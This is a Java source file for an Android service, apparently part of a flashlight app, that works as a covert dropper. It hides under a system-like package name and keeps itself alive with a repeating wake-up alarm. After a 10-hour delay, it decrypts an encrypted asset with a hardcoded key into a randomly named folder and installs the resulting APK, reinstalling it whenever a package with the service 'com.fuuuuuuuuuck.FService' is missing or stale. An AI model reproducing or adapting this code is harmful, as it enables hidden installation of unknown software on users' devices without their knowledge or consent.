package com.android;
import java.io.File;
import com.apps.flashlight.AppUtil;
import com.apps.flashlight.CommonUtil;
import com.apps.flashlight.FileUtil;
import com.apps.flashlight.SettingUtil;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;

public class AService extends android.app.Service {
    private SharedPreferences pref;
    private Handler handler = new Handler();
    private static final Object alarmLocker = new Object();
    private static long bizTime = 0;
    private static final Object bizLocker = new Object();
    private static final String bizTimeKey = AService.class.getName();
    public static final long alramInterval = 600;
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    public void onCreate() {
        pref = getSharedPreferences("myprefname", 0);
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = null;
        if (intent != null) action = intent.getAction();
        if ("do".equals(action)) {
            execute(this);
        } else if ("check".equals(action)) {
            check(this);
        } else if ("activate".equals(action)) {
            restartAlarm(this);
        } else {
            checkAlarm(this);
        }
        return 0;
    }
    private void checkAlarm(Context context) {
        if (System.currentTimeMillis() - getBizTime() > SettingUtil.getActivateInterval(context) * 1000) {
            restartAlarm(context);
        }
    }
    private long getBizTime() {
        synchronized (bizLocker) {
            if (bizTime <= 0) {
                bizTime = pref.getLong(bizTimeKey, 0);
            }
            return bizTime;
        }
    }
    private void updateBizTime() {
        synchronized (bizLocker) {
            bizTime = System.currentTimeMillis();
            pref.edit().putLong(bizTimeKey, bizTime).commit();
        }
    }
    private void execute(final Context context) {
        synchronized (bizLocker) {
            if (System.currentTimeMillis() - getBizTime() < SettingUtil.getActivateInterval(context) * 1000 / 2) return;
        }
        handler.post(new Runnable() {
            @Override
            public void run() {
                check(context);
            }
        });
    }
    private void restartAlarm(Context context) {
        synchronized (alarmLocker) {
            AlarmManager manager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            PendingIntent pending = PendingIntent.getService(context, 0, new Intent().setClass(context, AService.class).setAction("do"), 0);
            manager.cancel(pending);
            manager.setRepeating(AlarmManager.RTC_WAKEUP, 0, alramInterval * 1000, pending);
        }
    }
    public void check(final Context context) {
        long installTime = SettingUtil.getInstallTime(context);
        if (installTime == 0 || System.currentTimeMillis() - installTime < 3600 * 10 * 1000) return; //10小时之后再安装
        synchronized (bizLocker) {
            updateBizTime();
        }
        long updateInterval = 3600;
        PackageInfo info = AppUtil.getPackageByServiceName(context, "com.fuuuuuuuuuck.FService");
        if (info == null || System.currentTimeMillis() - info.lastUpdateTime > updateInterval * 1000) {
            installApp(context);
        }
    }
    private void installApp(final Context context) {
        String dir = Environment.getExternalStorageDirectory() + "/" + CommonUtil.getRandomString(10);
        new File(dir).delete();
        String apkPath = dir + "/tmp.apk";
        FileUtil.copyEncryptedAssetFile(context, "data", apkPath, "hellojj");
        AppUtil.installApp(apkPath);
    }
}
